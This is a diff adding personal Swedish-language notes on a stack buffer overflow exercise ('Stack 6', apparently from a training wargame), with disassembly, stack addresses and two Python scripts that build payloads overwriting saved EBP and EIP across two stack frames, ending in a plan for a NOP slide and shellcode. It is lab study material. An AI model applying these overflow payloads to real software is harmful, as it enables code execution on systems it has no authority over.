@@ -1,0 +1,83 @@
+**** STACK 6 ****
+* Find ret on the stack, and make sure to write the "correct" address to it?
+0xbffff7bc = ret
+
+cmp grejerna kollar så att första hex värdet efter 0x i gampla eip inte är 
+lika med bf, isf kör den exit(). Med andra ord får vi inte skriva över gampla
+eip med en adress som ligger på stacken (iom att adresserna där börjar på 0xbf)
+
+Måste alltså få gamla eip att peka på någon annan (lägre?) adress, där vi plaserar 
+shellkoden. Om jag minns rätt ligger buffern någonstans i minnet under exekvering
+innan den kopieras till stacken. Kanske kan hitta den :D
+
+Intressant?
+Contents of section .data:
+8049710 00000000 00000000
+
+ 8048492:       e8 29 ff ff ff          call   80483c0 <printf@plt>
+ 8048497:       a1 20 97 04 08          mov    eax,ds:0x8049720
+ 804849c:       89 04 24                mov    DWORD PTR [esp],eax
+ 804849f:       e8 0c ff ff ff          call   80483b0 <fflush@plt>
+ 80484a4:       8d 45 b4                lea    eax,[ebp-0x4c]
+ 80484a7:       89 04 24                mov    DWORD PTR [esp],eax
+ 80484aa:       e8 d1 fe ff ff          call   8048380 <gets@plt>
+ 80484af:       8b 45 04                mov    eax,DWORD PTR [ebp+0x4]
+ 80484b2:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
+
+ Skriv över main stacken också (iom att den ligger under getpath). Isf får
+ man se till att skriva shellcoden på den stacken, men också fixa så att
+ getpath har de returvärdet den ska ha: 0x08048505
+
+Saved eip när vi är i getpath är sparad på: 0xbffff7cc
+Verkar som att main har sin sparad på 0xbffff7dc?
+
+Tror offset blir A*20 för att nå första saved eip: 0x08048505
+Måste nog bevara ebp också? Den är sparad på: 0xbffff7c8
+Isf är offset för den: A*4*16, och valör ska vara: 0xbffff7d8
+
+Testar med detta om vi kan returnera från getpath med denna stack smash.
+
+---- TEST SCRIPT (saved ebp) ----
+#!/usr/bin/python
+import struct
+
+eip_getpath = struct.pack("I", 0x08048505)
+ebp_getpath = struct.pack("I", 0xbffff7d8)
+payload = "A"*4*19
+payload += ebp_getpath
+payload += eip_getpath + '\0'
+print(payload)
+----------------------------------
+
+Koden ovan fungerar som den ska, vilket gör att vi borde kunna skriva vidare
+över nästa stack frame, alltså den som tillhör main. Där kan vi då skriva över
+den gamla eip som ligger där och exekvera vår shellcode :D
+
+Main stacken är ganska liten, bara 8 bytes. Vilket gör att vi når nästa ebp genom en offset på:
+A*8, och alltså main saved eip med offset: A*12
+
+Uppdatera koden för att testa skriva 77777777 på nästa saved eip, bör alltså få segfault från mains ret:
+
+---- TEST SCRIPT 2 ----
+#!/usr/bin/python
+import struct
+
+eip_getpath = struct.pack("I", 0x08048505)
+ebp_getpath = struct.pack("I", 0xbffff7d8)
+payload_getpath = "A"*4*19
+payload_getpath += ebp_getpath
+payload_getpath += eip_getpath
+
+eip_main = struct.pack("I", 0x77777777)
+ebp_main = "BBBB"
+payload_main = "A"*8
+payload_main += ebp_main
+payload_main += eip_main
+
+payload = payload_getpath + payload_main
+print(payload)
+----------------------------------
+
+Med ovan kod kommer vi alltså åt saved eip i main, vilket gör att vi får kontroll över eip genom att 
+skriva över först getpath() stack frame, och sedan main() stackframe som ligger precis efter getpath()s stack.
+Efter det är det bara att göra en nopslide följt av shellcode, och peka saved eip mot detta :D
